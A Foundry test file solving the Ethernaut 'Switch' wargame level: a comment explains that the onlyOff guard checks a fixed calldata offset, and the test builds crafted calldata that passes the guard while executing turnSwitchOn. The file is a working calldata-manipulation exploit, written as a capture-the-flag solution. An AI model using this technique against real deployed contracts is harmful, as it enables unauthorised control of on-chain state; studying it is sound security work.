// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Switch} from "../src/levels/Switch.sol";

/// Ethernaut #29 "Switch" → calldata manipulation (no catalog entry). `onlyOff` inspects the selector
/// at a FIXED calldata offset (68), but the executed `_data` is read via its ABI offset pointer — so
/// craft calldata that puts `turnSwitchOff` at offset 68 (to pass the guard) while `_data` actually
/// holds `turnSwitchOn`. Win: switchOn == true.
contract SwitchTest is Test {
    function test_solve_switch() public {
        Switch lvl = new Switch();

        bytes4 flip = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 off = bytes4(keccak256("turnSwitchOff()"));
        bytes4 on = bytes4(keccak256("turnSwitchOn()"));

        bytes memory payload = abi.encodePacked(
            flip, //                                              [0:4]   flipSwitch selector
            uint256(0x60), //                                     [4:36]  _data offset = 0x60
            uint256(0), //                                        [36:68] filler
            off, bytes28(0), //                                   [68:72] off selector (passes onlyOff)
            uint256(4), //                                        [100:132] _data length = 4
            on, bytes28(0) //                                     [132:136] turnSwitchOn selector
        );

        (bool ok,) = address(lvl).call(payload);
        require(ok, "crafted call failed");
        assertTrue(lvl.switchOn(), "switch turned on past onlyOff");
    }
}
